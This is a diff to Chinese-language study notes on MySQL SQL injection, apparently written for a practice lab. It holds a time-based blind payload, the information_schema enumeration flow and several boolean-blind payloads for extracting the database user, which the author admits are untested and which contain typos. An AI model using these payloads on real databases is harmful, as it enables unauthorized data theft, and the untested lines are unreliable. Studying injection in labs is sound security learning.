@@ -17,7 +17,7 @@ if(length(database())=12,sleep(5),1)
 
 ## 基本的查询
 
-    ```
+    ```txt
     Mysql 有一个系统数据库 information_schema，存储着所有的数据库的相关信息，一般的， 我们利用该表可以进行一次完整的注入。以下为一般的流程。  
     猜数据库  
     select schema_name from information_schema.schemata  
@@ -29,13 +29,13 @@ if(length(database())=12,sleep(5),1)
     Select *** from ****
     ```
 
-```mysql
-暂时还没测试成功的......有没有路过的野生大神讲解一下。。。
-IFNULL(ascii(substr(user(),1,1))/(114%ascii(substr (user(),1,1))),'yes’)
-IFNULL(hex(substr(user(),1,1))/(114%hex(substr(u ser(),1,1))),'yes’)
-IFNULL(1/(locate(substr(user(),1,1),'r')),'yes’)
-IFNULL(1/(locate(right(left(lower(user()),1),1),'r')),' yes’)
-```
+    ```mysql
+    暂时还没测试成功的......有没有路过的野生大神讲解一下。。。
+    IFNULL(ascii(substr(user(),1,1))/(114%ascii(substr (user(),1,1))),'yes’)
+    IFNULL(hex(substr(user(),1,1))/(114%hex(substr(u ser(),1,1))),'yes’)
+    IFNULL(1/(locate(substr(user(),1,1),'r')),'yes’)
+    IFNULL(1/(locate(right(left(lower(user()),1),1),'r')),' yes’)
+    ```
 
 ## 第一关
 
